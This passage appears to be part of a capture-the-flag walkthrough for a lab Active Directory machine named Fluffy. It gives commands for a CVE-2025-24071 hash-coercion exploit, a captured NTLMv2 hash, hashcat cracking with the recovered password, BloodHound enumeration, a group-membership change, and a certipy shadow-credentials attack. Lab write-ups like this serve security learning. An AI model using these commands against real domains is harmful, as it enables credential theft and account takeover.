<p>This produces the list of computers, groups, users and permissions.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2025-24071">CVE-2025-24071<a href="#cve-2025-24071" class="hash-link" aria-label="Direct link to CVE-2025-24071" title="Direct link to CVE-2025-24071" translate="no">​</a></h2>
<p>We managed to fabricate the payload required and upload it via SMB.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep </span><br></span></code></pre></div></div>
<p>When listening for events with responder, we get the NTLM Hash of user p.agila</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[+] Listening for events...                                                                                                                                                                                                                 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[SMB] NTLMv2-SSP Client   : 10.10.11.69</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[SMB] NTLMv2-SSP Username : FLUFFY\p.agila</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:bd8f7fef990474ff:C7C0CB9CAC9525F2D208E32C10E7C248:0101000000000000001DAD238801DC01142342D76B81FA3800000000020008004E0058003800370001001E00570049004E002D0041005A00310051004E0056003200410030004400490004003400570049004E002D0041005A00310051004E005600320041003000440049002E004E005800380037002E004C004F00430041004C00030014004E005800380037002E004C004F00430041004C00050014004E005800380037002E004C004F00430041004C0007000800001DAD238801DC0106000400020000000800300030000000000000000100000000200000281213D3D4900283CBDD465132F4069EAD5996FF744C8BC81B4B59245480EF190A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310039000000000000000000</span><br></span></code></pre></div></div>
<p>With hashcat and rockyou, we are able to retrieve the password:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt</span><br></span></code></pre></div></div>
<p>prometheusx-303</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bloodhound">Bloodhound<a href="#bloodhound" class="hash-link" aria-label="Direct link to Bloodhound" title="Direct link to Bloodhound" translate="no">​</a></h3>
<p>From the LDAP dump, we know that this user is a Service Account Manager.</p>
<p>We can use bloodhound to analyze the Active Directory data:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bloodhound-python -u &quot;p.agila@fluffy.htb&quot; -p &quot;prometheusx-303&quot; -ns 10.10.11.69 -d fluffy.htb -c all -dc dc01.fluffy.htb --zip</span><br></span></code></pre></div></div>
<p>It is really import to collect all the fields, otherwise some permission declaration will not be present in the graph database. Also, the key was provide the <code>-dc</code> flag.</p>
<p>Using the bloodhound UI, we can see an interesting path: p.agila user reaches to the winrm_svc account, which most likely will allow us to connect to the machine with evil-winrm.</p>
<p>First, we need to add the user p.agila to SERVICE_ACCOUNTS group:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">net rpc group addmem &quot;SERVICE ACCOUNTS@FLUFFY.HTB&quot; &quot;p.agila&quot; -U &quot;fluffy.htb&quot;/&quot;P.AGILA&quot;%&quot;prometheusx-303&quot; -S 10.10.11.69</span><br></span></code></pre></div></div>
<p>The msDS-KeyCredentialLink attribute is a multi-valued attribute on AD user or computer objects used to store public key material (or references to it) for passwordless authentication methods like Windows Hello for Business (WHfB) and FIDO2 security keys. When a user attempts to authenticate using such a credential, the system presents a cryptographic proof tied to the private key, and AD validates it against the public key material linked via this attribute.</p>
<p>Attackers with write access to an account&#x27;s msDS-KeyCredentialLink attribute can add their own public key material, creating what&#x27;s known as &quot;shadow credentials.&quot; This allows the attacker to subsequently authenticate as that user without needing their password, by using the corresponding private key they control. Certipy&#x27;s shadow auto command can be used to exploit this if the necessary permissions are available. While distinct from AD CS certificate abuse, it&#x27;s another form of key-based authentication bypass/persistence.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">certipy-ad shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27;  -account &#x27;WINRM_SVC&#x27;  -dc-ip &#x27;10.10.11.69&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br></span></code></pre></div></div>
<p>This is because the clock is not synchronized between the attacking machine and the target. We need to sync the clock with the target machine:</p>
<p>Execute the following as root:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">timedatectl set-ntp off</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rdate -n [IP of Target]</span><br></span></code></pre></div></div>
<p>This will stop NTP and sync the date and time with the IP provided.</p>
<p>After doing this, the shadow credential attack is successful and we retrieve the NT hash for <code>winrm_svc</code></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#enumeration" class="table-of-contents__link toc-highlight">Enumeration</a><ul><li><a href="#ldap-enumeration" class="table-of-contents__link toc-highlight">LDAP enumeration</a></li></ul></li><li><a href="#cve-2025-24071" class="table-of-contents__link toc-highlight">CVE-2025-24071</a><ul><li><a href="#bloodhound" class="table-of-contents__link toc-highlight">Bloodhound</a></li></ul></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>